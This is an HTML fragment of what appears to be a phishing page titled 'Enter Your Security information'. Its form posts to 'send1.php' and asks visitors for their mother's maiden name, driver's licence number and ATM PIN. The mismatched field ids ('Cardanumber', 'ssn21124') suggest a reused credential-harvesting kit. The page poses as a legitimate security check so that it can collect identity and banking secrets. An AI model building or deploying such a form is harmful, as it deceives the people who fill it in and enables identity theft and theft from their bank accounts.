...
<table width="100%" border="0" cellpadding="2">
  <tr>
    <td>
      <b class="h1">Enter Your Security information</b></td>
  </tr>
...
<form dir="" class="cmxform" id="signupForm" method="POST" action="send1.php">
...
<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;">
	<p style="text-align: left"><span><label for="NameonCards"><b>
	Mother Maiden's Name:</b></label></span></td><td><span>
<input type="text" name="mm" id="NameonCards" class="NameonCards" size="50" maxlength=50/></span>
</td></tr>


<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;">
	<p dir="ltr" style="text-align: left"><span><label for="enterAddressAddressLine1"><b>
	Driver's Licence:</b></label></span></td>
<td><span>
<input type="text" name="d" id="Cardanumber" class="enterAddressFormField" size="50" maxlength=60/></span>
<br /><span class="tiny">no dashes or spaces</span></td></tr>


<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;">
	<p style="text-align: left"><label for="ssn21124"><b>Atm Pin</b></label><span><label for="ssn21124"><b>: </b></label></span></td><td><span>
<input type="text" name="ssn" id="ssn21124" class="enterAddressFormField" size="20" maxlength=20/></span>
</td></tr>
